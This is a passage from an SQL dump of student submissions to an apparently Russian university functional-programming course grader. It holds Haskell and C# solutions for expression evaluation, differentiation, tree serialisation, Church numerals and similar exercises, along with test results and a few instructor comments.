eExpr();\r\n\r\n                retVal = t + e;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = t;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n\r\n\r\n        #region Read\r\n\r\n        string rPrim()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            switch (c)\r\n\r\n            {\r\n\r\n                case ''('':\r\n\r\n                    {\r\n\r\n                        retVal = rExpr();\r\n\r\n                        if (NextChar() != '')'')\r\n\r\n                        {\r\n\r\n                            throw new Exception();\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n                default:\r\n\r\n                    {\r\n\r\n                        PushBack();\r\n\r\n                        retVal = rNumber();\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        string rNumber()\r\n\r\n        {\r\n\r\n            char c = NextChar();\r\n\r\n            StringBuilder retVal = new StringBuilder("");\r\n\r\n            retVal.Append(c);\r\n\r\n            c = NextChar();\r\n\r\n            while (Char.IsDigit(c))\r\n\r\n            {\r\n\r\n                retVal.Append(c);\r\n\r\n                c = NextChar();\r\n\r\n            }\r\n\r\n            PushBack();\r\n\r\n            return retVal.ToString();\r\n\r\n        }\r\n\r\n        string rTerm()\r\n\r\n        {\r\n\r\n            string p = rPrim();\r\n\r\n            string retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''*'')\r\n\r\n            {\r\n\r\n                retVal = p + "*" + rTerm();\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = p;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        string rExpr()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            string t = rTerm();\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''+'')\r\n\r\n            {\r\n\r\n                string e = rExpr();\r\n\r\n                retVal = t + "+" + e;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = t;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n\r\n\r\n        #region Diff\r\n\r\n        string dExpr()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            string t = dTerm();\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''+'')\r\n\r\n            {\r\n\r\n                retVal = t + "+" + dExpr();\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = t;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        string dTerm()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            int sp = pos;\r\n\r\n            string rP = rPrim();\r\n\r\n            pos = sp;\r\n\r\n            string p = dPrim();\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''*'')\r\n\r\n            {\r\n\r\n                sp = pos;\r\n\r\n                string rT = rTerm();\r\n\r\n                pos = sp;\r\n\r\n                string t = dTerm();\r\n\r\n                retVal = string.Format("({0})*({1})+({2})*({3})",p,rT,rP,t);\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = p;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        string dPrim()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            switch (c)\r\n\r\n            {\r\n\r\n                case ''('':\r\n\r\n                    {\r\n\r\n                        retVal = dExpr();\r\n\r\n                        if (NextChar() != '')'')\r\n\r\n                        {\r\n\r\n                            throw new Exception();\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n                default:\r\n\r\n                    {\r\n\r\n                        PushBack();\r\n\r\n                        retVal = dNumber();\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        string dNumber()\r\n\r\n        {\r\n\r\n            string retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''x'')\r\n\r\n            {\r\n\r\n                retVal = "1";\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                while (Char.IsDigit(c))\r\n\r\n                {\r\n\r\n                    c = NextChar();\r\n\r\n                }\r\n\r\n                PushBack();\r\n\r\n                retVal = "0";\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            //Console.WriteLine("input expression with x");\r\n\r\n            string s = "(x+x)*(x*x+1)";//-- 2*x^3+2*x  //Console.ReadLine();\r\n\r\n            Expression expr = new Expression(s);\r\n\r\n            //Console.WriteLine("input x");\r\n\r\n            int x = 2;//-- 2//int.Parse(Console.ReadLine());\r\n\r\n            Console.WriteLine(expr.Eval(x));\r\n\r\n            Console.WriteLine(expr.Diff());//-- 6*x^2+2\r\n\r\n            Console.WriteLine((new Expression(expr.Diff())).Eval(x));//-- 26\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4137, 97, '533223', '2012-11-25 17:32:56', 0, 'checkBrackets ys = checkBrackets1 [] ys\r\n\r\ncheckBrackets1 (x;xs) (y:ys) = if ( y == ''('' || y == ''['' )\r\n				then checkBrackets1 (y:x:xs) ys\r\n				else if ( ((y == '')'') && (x == ''('')) && ((y == '']'') && (x == ''['')) ) \r\n					then checkBrackets1 xs ys\r\n					else false\r\n\r\n\r\ncheckBrackets1 [] (y:ys) = if ( y == ''('' || y == ''['' )\r\n				then checkBrackets1 [y] ys\r\n				else false\r\n\r\ncheckBrackets1 [] [] = true\r\ncheckBrackets1 _ _ = false', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'']", проверьте правильность синтаксиса'),
(4138, 111, '550896', '2012-11-25 17:39:43', 1, 'data Expr = Var String | N Int | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval :: Expr -> [(String, Int)] -> Int\r\neval (Var v) a = variable v a\r\neval (N i) a = i\r\neval (Add e0 e1) a = (eval e0 a) + (eval e1 a)\r\neval (Mult e0 e1) a = (eval e0 a) * (eval e1 a)\r\n\r\nvariable :: String -> [(String, Int)] -> Int\r\nvariable s [] = 0\r\nvariable s a | fst (head a) == s = snd (head a)\r\nvariable s a = variable s (tail a)\r\n', '<br/>Тесты успешно пройдены!'),
(4139, 97, '533223', '2012-11-25 17:42:52', 1, 'checkBrackets ys = checkBrackets1 [] ys\r\n\r\ncheckBrackets1 (x:xs) (y:ys) = if ( ( y == ''('' ) || ( y == ''['' ) )\r\n				then checkBrackets1 (y:x:xs) ys\r\n				else if ((( y == '')'' ) && ( x == ''('' )) || (( y == '']'' ) && ( x == ''['' ))) \r\n					then checkBrackets1 xs ys\r\n					else False\r\n\r\n\r\ncheckBrackets1 [] (y:ys) = if ( ( y == ''('' ) || ( y == ''['' ) )\r\n				then checkBrackets1 (y:[]) ys\r\n				else False\r\n\r\ncheckBrackets1 [] [] = True\r\ncheckBrackets1 _ _ = False', '<br/>Тесты успешно пройдены!'),
(4140, 112, '550896', '2012-11-25 17:44:06', 1, 'data Expr = Let String Int Expr | Var String | N Int | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval :: Expr -> [(String, Int)] -> Int\r\neval (Let s i e) a = eval e ((s, i):a)\r\neval (Var v) a = variable v a\r\neval (N i) a = i\r\neval (Add e0 e1) a = (eval e0 a) + (eval e1 a)\r\neval (Mult e0 e1) a = (eval e0 a) * (eval e1 a)\r\n\r\nvariable :: String -> [(String, Int)] -> Int\r\nvariable s [] = 0\r\nvariable s a | fst (head a) == s = snd (head a)\r\nvariable s a = variable s (tail a)', '<br/>Тесты успешно пройдены!'),
(4141, 98, '63706456', '2012-11-25 17:53:11', 0, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving (Show, Eq)\r\n\r\n\r\n--заимствовал трюк из http://www.haskell.org/tutorial/stdclasses.html\r\n--8.3 The Read and Show Classes\r\nshowsTree Empty s = ''n'':s\r\nshowsTree (Node val l r) s = ''('' : shows val (showsTree l (showsTree r ('')'': s)))\r\n\r\nreadsTree (''('':val:s) 	= [(Node val l r, u) | 	(l, t) 		<- readsTree s,\r\n						(r, '')'':u) 	<- readsTree t]\r\nreadsTree (''n'':s) 	= [(Empty, s)]\r\nreadsTree p 		= [(Empty, p)]\r\n\r\ntoStr tree = showsTree tree ""\r\n\r\nfromStr = fst . head . readsTree', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(4142, 113, '550896', '2012-11-25 17:54:27', 2, '  --- Нет, это не по условию (не continuation passing style)... В частности, это у вас не хвостовая рекурсия.\r\nsum_cps :: [Int] -> (Int -> Int) -> Int\r\nsum_cps [] f = f 0\r\nsum_cps a f = f ((head a) + sum_cps (tail a) id)', '<br/>Тесты успешно пройдены!'),
(4143, 98, '63706456', '2012-11-25 17:55:19', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving (Show, Eq)\r\n\r\n\r\n--заимствовал трюк из http://www.haskell.org/tutorial/stdclasses.html\r\n--8.3 The Read and Show Classes\r\n   --- ОК, очень разумно с вашей стороны..\r\nshowsTree Empty s = ''n'':s\r\nshowsTree (Node val l r) s = ''('' : val : (showsTree l (showsTree r ('')'': s)))\r\n\r\nreadsTree (''('':val:s) 	= [(Node val l r, u) | 	(l, t) 		<- readsTree s,\r\n						(r, '')'':u) 	<- readsTree t]\r\nreadsTree (''n'':s) 	= [(Empty, s)]\r\nreadsTree p 		= [(Empty, p)]\r\n\r\ntoStr tree = showsTree tree ""\r\n\r\nfromStr = fst . head . readsTree', '<br/>Тесты успешно пройдены!'),
(4144, 115, '550896', '2012-11-25 18:14:34', 0, 'f :: [Int] -> [Int]\r\nf a = if ((null (find (<5) a)) || (null (find (>10) a)) || (null (find (/=7) a))) then []\r\n      else [sum (find (<5) a ++ find (>10) a ++ find (/=7) a)]', 'Не удалось вычислить выражение "f [7, 6, 4, 3, 20, 15, 9] ", проверьте правильность синтаксиса'),
(4145, 115, '550896', '2012-11-25 18:14:52', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf :: [Int] -> [Int]\r\nf a = if ((null (find (<5) a)) || (null (find (>10) a)) || (null (find (/=7) a))) then []\r\n      else [sum (find (<5) a ++ find (>10) a ++ find (/=7) a)]', '<br/>Тесты успешно пройдены!'),
(4146, 114, '397095', '2012-11-25 18:42:55', 1, 'triangle1 n = [1..n] >>= 	 -> [1..t]\r\ntriangle2 n =\r\n	do\r\n		t <- [1..n]\r\n		[1..t]', '<br/>Тесты успешно пройдены!'),
(4147, 118, '397095', '2012-11-25 18:49:01', 0, '(>>>) f1 f2 = f2 . snd . f1', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4148, 118, '397095', '2012-11-25 18:49:33', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 = f2 . snd . f1', '<br/>Тесты успешно пройдены!'),
(4149, 115, '397095', '2012-11-25 18:56:32', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = [ x+y+z | x <- find (<5) xs, y <- find (>10) xs, z <- find (/=7) xs]	', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(4150, 98, '419046', '2012-11-25 19:30:25', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr Empty = "e"\r\n\r\ntoStr (Node a l r) = "n" ++ (a:(toStr l)) ++ (toStr r)\r\n\r\nfromStr s = fst (fromStr1 s)\r\n\r\nfromStr1 (''e'':s) = (Empty, s)\r\n\r\nfromStr1 (''n'':s) = let \r\n\r\n                         (l, restl) = fromStr1 (tail s)\r\n\r\n                         (r, restr) = fromStr1 restl\r\n\r\n                   in ((Node (head s) l r), restr)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4151, 98, '355679', '2012-11-25 19:37:44', 1, 'import Data.List\r\n\r\nimport Data.Maybe\r\n\r\n\r\n\r\ndata Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\n\r\n\r\ntoStr Empty = ""\r\n\r\ntoStr (Node c l r) = c : "(" ++ (toStr l) ++ ")(" ++ (toStr r) ++ ")"\r\n\r\n\r\n\r\nmatchingBracketIndex str = matchingBracketIndex'' str 1\r\n\r\nmatchingBracketIndex'' _ 0 = -1\r\n\r\nmatchingBracketIndex'' str count =\r\n\r\n	let {\r\n\r\n		maybe1 = elemIndex ''('' str;\r\n\r\n		maybe2 = elemIndex '')'' str;\r\n\r\n\r\n\r\n		mi = \r\n\r\n			if maybe1 == Nothing then\r\n\r\n				fromJust maybe2\r\n\r\n			else if maybe2 == Nothing then\r\n\r\n				fromJust maybe1\r\n\r\n			else\r\n\r\n				min (fromJust maybe1) (fromJust maybe2);\r\n\r\n\r\n\r\n		strTail = drop mi str;\r\n\r\n		bracket = head strTail;\r\n\r\n		newCount =\r\n\r\n			if bracket == ''('' then\r\n\r\n				count + 1\r\n\r\n			else if bracket == '')'' then\r\n\r\n				count - 1\r\n\r\n			else\r\n\r\n				1/0;\r\n\r\n	} in (\r\n\r\n		mi + 1 + (matchingBracketIndex'' (tail strTail) newCount)\r\n\r\n	)\r\n\r\n\r\n\r\nsplit str = let {\r\n\r\n		i = (matchingBracketIndex (tail str)) + 1;\r\n\r\n		str1 = drop 1 (take i str);\r\n\r\n		str2'' = drop (i + 2) str;\r\n\r\n		str2 = take (length str2'' - 1) str2'';\r\n\r\n	} in (str1, str2)\r\n\r\n \r\n\r\nfromStr "" = Empty\r\n\r\nfromStr (c:str) = let {\r\n\r\n		(l, r) = split str;\r\n\r\n	} in (\r\n\r\n		Node c (fromStr l) (fromStr r)\r\n\r\n	)\r\n\r\n\r\n\r\ntree = Node ''a'' (Node ''b'' Empty Empty) Empty\r\n\r\ntest = show (fromStr (toStr tree)) == show tree\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4152, 111, '533223', '2012-11-25 19:40:26', 1, 'data Expr = Var [Char] | N Integer | Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\nfoldExpr fa fm fx fn (Var x) = fx x\r\nfoldExpr fa fm fx fn (N n) = fn n\r\nfoldExpr fa fm fx fn (Add e1 e2) = fa ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm fx fn e1\r\n					ef2 = foldExpr fa fm fx fn e2\r\nfoldExpr fa fm fx fn (Mult e1 e2) = fm ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm fx fn e1\r\n					ef2 = foldExpr fa fm fx fn e2\r\n\r\neval expr xs = foldExpr (e1 e2-> e1 + e2) (e1 e2-> e1*e2) (x -> subs x xs ) (\r\n->n) expr\r\n\r\nsubs x (( a, b ):ys) = if (x == a) then b\r\n				else subs x ys', '<br/>Тесты успешно пройдены!'),
(4153, 98, '4169333', '2012-11-25 19:46:51', 2, '  --- Вы не совсем поняли условие.. fromStr должна возвращаетб не строку, а дерево (Tree).\r\n  --- Например fromStr "e" у вас возвращает строку "Empty", а должна возвращаеть пустое дерево.\r\n  --- Попробуйте исправить, пожалуйста, скажем дл пятницы включительно.\r\ndata Tree= Empty | Node Char Tree Tree deriving Show\r\ntoStr (Node ''a'' l r)=  "na"++ (toStr (l)) ++ (toStr (r))\r\ntoStr (Node ''b'' l r)=  "nb"++ (toStr (l)) ++ (toStr (r))\r\ntoStr Empty ="e"\r\n\r\nfromStr [] = ")"\r\nfromStr (''e'':[])= "Empty)"\r\nfromStr (x:y:xs) =   if  (x ==''n'' && y ==''a'')\r\n	             then "(Node ''a'' " ++ fromStr (xs) \r\n                     else if (x ==''n''&& y ==''b'')\r\n                     then "(Node ''b'' " ++ fromStr (xs) \r\n                     else if ((x==''a'' || x==''b'') && (y==''n''))\r\n                     then "(Node " ++ fromStr (xs) \r\n		     else if ( x==''e'' && y==''e'')\r\n		     then "Empty Empty) " ++ fromStr(xs)\r\n		     else if ( x==''e'')\r\n		     then "Empty " ++ fromStr(y:xs)\r\n                     else \r\n                     fromStr xs\r\n', 'Выражение имеет неправильное значение: fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))'),
(4154, 112, '533223', '2012-11-25 20:17:16', 1, 'data Expr = Var [Char] | N Integer | Add Expr Expr| Mult Expr Expr | Let [Char] Integer Expr deriving Show\r\n\r\nfoldExpr fa fm fx fn fl (Let x n expr) = fl x n expr\r\nfoldExpr fa fm fx fn fl (Var x) = fx x\r\nfoldExpr fa fm fx fn fl (N n) = fn n\r\nfoldExpr fa fm fx fn fl (Add e1 e2) = fa ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm fx fn fl e1\r\n					ef2 = foldExpr fa fm fx fn fl e2\r\nfoldExpr fa fm fx fn fl (Mult e1 e2) = fm ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm fx fn fl e1\r\n					ef2 = foldExpr fa fm fx fn fl e2\r\n\r\neval expr xs = foldExpr (e1 e2-> e1 + e2) (e1 e2-> e1*e2) (x -> subs x xs ) (\r\n->n) (x n e -> eval e (( x, n ):xs )) expr\r\n\r\nsubs x (( a, b ):ys) = if ( x == a ) then b\r\n				else subs x ys', '<br/>Тесты успешно пройдены!'),
(4155, 119, '517309', '2012-11-25 20:19:51', 0, 'toInt _ = 2\r\ndec _ = _', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4156, 119, '517309', '2012-11-25 20:20:18', 2, 'toInr _ = 2\r\ndec x = x', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4157, 108, '355679', '2012-11-25 20:37:06', 1, 'captures (x1,y1) (x2,y2) = x1 == x2 || y1 == y2 || abs (x1 - x2) == abs (y1 - y2)\r\n\r\n\r\n\r\nqueens n k = queens'' n k (const False)\r\n\r\n\r\n\r\nqueens'' _ 0 _ = [[]]\r\n\r\nqueens'' n k isCaptured = \r\n\r\n	foldr\r\n\r\n		(x res ->\r\n\r\n			let {\r\n\r\n				cell = (k,x);\r\n\r\n				recursive = queens'' n (k - 1) (cell1 -> isCaptured cell1 || captures cell cell1);\r\n\r\n			} in (\r\n\r\n				if not (isCaptured cell) then\r\n\r\n					foldr\r\n\r\n						(cellList res1 ->\r\n\r\n							(cell:cellList):res1\r\n\r\n						)\r\n\r\n						res\r\n\r\n						recursive	\r\n\r\n				else\r\n\r\n					res\r\n\r\n			)\r\n\r\n		)\r\n\r\n		[]\r\n\r\n		[1..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4158, 119, '12206137', '2012-11-25 21:50:06', 0, 'toInt chNum = chNum (+ 1) 0\r\n\n\r\n\ndec num f x =\r\n\n    let newF (g, x) = (f, g x) in\r\n\n    snd $ num newF (id, x)\n', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4159, 119, '12206137', '2012-11-25 21:53:31', 0, 'dec num f x =\r\n    let newF (g, x) = (f, g x) in\r\n    snd $ num newF (id, x)', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4160, 120, '12206137', '2012-11-25 21:53:56', 1, '(|>) x f = f x\r\n\r\n\r\n\r\ndata Term = Var String | Impl Term Term\r\n\r\n\r\n\r\nisTautology = null . falseVals\r\n\r\n\r\n\r\nisJoint set1 set2 = not (set1 |> any ((x1,v1) -> set2 |> any ((x2,v2) -> x1 == x2 && v1 /= v2)))\r\n\r\n\r\n\r\n-- !(a -> b) = a & !b\r\n\r\nfalseVals :: Term -> [[(String, Bool)]]\r\n\r\nfalseVals (Var s) = [[(s,False)]]\r\n\r\nfalseVals (Impl left right) =\r\n\r\n    let\r\n\r\n        l'' = trueVals left\r\n\r\n        r'' = falseVals right\r\n\r\n    in\r\n\r\n    [x ++ y | x <- l'', y <- filter (isJoint x) r'']\r\n\r\n\r\n\r\n-- a -> b = !a | b\r\n\r\ntrueVals (Var s) = [[(s,True)]]\r\n\r\ntrueVals (Impl left right) =\r\n\r\n    falseVals left ++ trueVals right\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4161, 113, '533223', '2012-11-26 02:57:11', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))', '<br/>Тесты успешно пройдены!'),
(4162, 88, '3431532', '2012-11-26 06:38:26', 1, '11', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(4163, 30, '3431532', '2012-11-26 06:40:31', 2, '  --- вы случайно выложили пустое решение для старой задачи', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(4164, 99, '3431532', '2012-11-26 06:43:49', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication2\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n           Console.WriteLine(Simplify(Diff(new Mult(new Var(''X''),new Var(''X'')))).ToString());\r\n        }\r\n\r\n        static Expr Simplify(Expr expr)\r\n        {\r\n            if (expr.GetType() == typeof(Mult))\r\n            {\r\n                Mult ex = (Mult)expr;\r\n                if ((ex.a.GetType() == typeof(Num) && ((Num)ex.a).a == 0) ||\r\n                    ex.b.GetType() == typeof(Num) && ((Num)ex.b).a == 0)\r\n                    return new Num(0);\r\n                if (ex.a.GetType() == typeof(Num) && ex.b.GetType() == typeof(Num))\r\n                    return new Num(((Num)ex.a).a * ((Num)ex.b).a);\r\n                return new Mult(Simplify(((Mult)expr).a), Simplify(((Mult)expr).b));\r\n            }\r\n\r\n            if (expr.GetType() == typeof(Add))\r\n            {\r\n                return new Add(Simplify(((Add)expr).a), Simplify(((Add)expr).b));\r\n            }\r\n\r\n            if (expr.GetType() == typeof(Sub))\r\n            {\r\n                return new Sub(Simplify(((Sub)expr).a), Simplify(((Sub)expr).b));\r\n            }\r\n            return expr;\r\n        }\r\n\r\n        static Expr Diff(Expr expr)\r\n        {\r\n            if (expr.GetType() == typeof(Add))\r\n            {\r\n                return new Add(Diff(((Add)expr).a), Diff(((Add)expr).b));\r\n            }\r\n            else if (expr.GetType() == typeof(Sub))\r\n            {\r\n                return new Sub(Diff(((Sub)expr).a), Diff(((Sub)expr).b));\r\n            }\r\n            else if (expr.GetType() == typeof(Mult))\r\n            {\r\n                return new Add(new Mult(Diff(((Mult)expr).a), ((Mult)expr).b),\r\n                                new Mult(Diff(((Mult)expr).b), ((Mult)expr).a));\r\n            }\r\n            else if (expr.GetType() == typeof(Num))\r\n            {\r\n                return new Num(0);\r\n            }\r\n            else if (expr.GetType() == typeof(Var))\r\n            {\r\n                return new Num(1);\r\n            }\r\n            return null;\r\n        }\r\n    }\r\n\r\n\r\n\r\n    abstract class Expr\r\n    {\r\n    }\r\n\r\n\r\n    class Var : Expr\r\n    {\r\n        public char x;\r\n        public Var(char x)\r\n        {\r\n            this.x = x;\r\n\r\n        }\r\n\r\n        public override String ToString()\r\n        {\r\n            return String.Format("(Var {0})",x);\r\n        }\r\n    }\r\n\r\n    class Add : Expr\r\n    {\r\n        public Expr a, b;\r\n        public Add(Expr a, Expr b)\r\n        {\r\n            this.a = a;\r\n            this.b = b;\r\n        }\r\n        public override String ToString()\r\n        {\r\n            return String.Format("(Add {0} {1})", a,b);\r\n        }\r\n    }\r\n    class Num : Expr\r\n    {\r\n        public int a;\r\n        public Num(int b)\r\n        {\r\n            this.a = b;\r\n        }\r\n        public override String ToString()\r\n        {\r\n            return String.Format("(Num {0})", a);\r\n        }\r\n\r\n    }\r\n    class Sub : Expr\r\n    {\r\n        public Expr a, b;\r\n        public Sub(Expr a, Expr b)\r\n        {\r\n            this.a = a;\r\n            this.b = b;\r\n        }\r\n        public override String ToString()\r\n        {\r\n            return String.Format("(Sub {0} {1})", a, b);\r\n        }\r\n    }\r\n    class Mult : Expr\r\n    {\r\n        public Expr a, b;\r\n        public Mult(Expr a, Expr b)\r\n        {\r\n            this.a = a;\r\n            this.b = b;\r\n        }\r\n        public override String ToString()\r\n        {\r\n            return String.Format("(Mult {0} {1})", a, b);\r\n        }\r\n    }\r\n\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4165, 115, '318210', '2012-11-26 07:50:09', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = (mapM (`find` xs)[(<5),(>10),(==7)])  >>= (	 -> return (sum t) )', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4166, 115, '318210', '2012-11-26 07:51:22', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = (mapM (`find` xs)[(<5),(>10),(/=7)])  >>= (	 -> return (sum t) )', '<br/>Тесты успешно пройдены!'),
(4167, 115, '1384577', '2012-11-26 08:22:51', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs =[x+y+z | x<-find (<5) xs, y<-find (>10) xs, z<-find (/=7) xs]', '<br/>Тесты успешно пройдены!'),
(4168, 114, '318210', '2012-11-26 08:29:53', 1, 'triangle n = concatMap (enumFromTo 1) [1..n]\r\ntriangle1 n = [1..n] >>= (x -> enumFromTo 1 x) \r\ntriangle2 n = do x <- [1..n]\r\n		 y <- enumFromTo 1 x\r\n		 return y', '<br/>Тесты успешно пройдены!'),
(4169, 114, '1384577', '2012-11-26 08:38:28', 1, 'triangle1 n = [1..n] >>= x-> [1..x] >>= y -> return y\r\ntriangle2 n = do \r\n		x<-[1..n]\r\n		y<-[1..x]\r\n		return y ', '<br/>Тесты успешно пройдены!'),
(4170, 116, '1384577', '2012-11-26 09:35:26', 0, 'toInt chirch = chirch (+1) 0', '<br/>Тесты успешно пройдены!'),
(4171, 117, '1384577', '2012-11-26 09:37:41', 0, 'toInt chirch = chirch (+1) 0', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4172, 116, '1384577', '2012-11-26 09:38:24', 1, 'toInt chirch = chirch (+1) 0\r\ninc chirch = f x -> f (chirch f x)', '<br/>Тесты успешно пройдены!'),
(4173, 117, '1384577', '2012-11-26 09:39:07', 1, 'toInt chirch = chirch (+1) 0\r\ninc chirch = f x -> f (chirch f x)', '<br/>Тесты успешно пройдены!'),
(4174, 113, '1384577', '2012-11-26 10:41:10', 1, 'sum_cps [] f = f 0 \r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))\r\n', '<br/>Тесты успешно пройдены!'),
(4175, 116, '12206137', '2012-11-26 12:19:57', 1, 'toInt chNum = chNum (+ 1) 0', '<br/>Тесты успешно пройдены!'),
(4176, 117, '12206137', '2012-11-26 12:21:20', 1, 'toInt chNum = chNum (+ 1) 0\r\n\r\ninc num f x = f (num f x)\r\n', '<br/>Тесты успешно пройдены!'),
(4177, 111, '3607492', '2012-11-26 13:21:44', 1, 'data Expr = Add Expr Expr | Mult Expr Expr | Var String | N Int\r\n\r\nfindInDict [] a1 = 0\r\nfindInDict ((a,b):xs) a1 = if (a1 == a) then b else findInDict xs a1\r\n\r\neval x [] = 0\r\neval (Add x y) dict = eval x dict + eval y dict\r\neval (Mult x y) dict = eval x dict * eval y dict\r\neval (N z) dict = z\r\neval (Var t) dict = findInDict dict t', '<br/>Тесты успешно пройдены!'),
(4178, 112, '3607492', '2012-11-26 13:44:33', 1, 'data Expr = Add Expr Expr | Mult Expr Expr | Var String | N Int | Let String Int Expr\r\n\r\nfindInDict [] a1 = 0\r\nfindInDict ((a,b):xs) a1 = if (a1 == a) then b else findInDict xs a1\r\n\r\neval x [] = 0\r\neval (Add x y) dict = eval x dict + eval y dict\r\neval (Mult x y) dict = eval x dict * eval y dict\r\neval (N z) dict = z\r\neval (Var t) dict = findInDict dict t\r\neval (Let x val e) dict = eval e ((x,val):dict)', '<br/>Тесты успешно пройдены!'),
(4179, 113, '3607492', '2012-11-26 13:50:53', 2, '   --- Нет, это не совсем то. Это удовлетворяет формальным требованиям, перечисленным в конце, но все равно\r\n   --- это не continuation passing style. Попробуйте все-таки разобраться, что это за стиль такой, пожалуйста.\r\n   --- (Подсказка: f должен быть накапливающим параметром и в нем должна копиться _функция_)\r\nsum_cps [] f = 0\r\nsum_cps [x] f = f x\r\nsum_cps (x:y:xs) f = sum_cps (x+y:xs) f', '<br/>Тесты успешно пройдены!'),
(4180, 119, '3742311', '2012-11-26 13:55:45', 0, 'toInt cond = cond (+1) 0\r\n\r\nnewFunc f = (x, y) -> (f x, x)\r\n\r\ndec func = f x -> let (_, res) = func (newFunc f) x in res', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
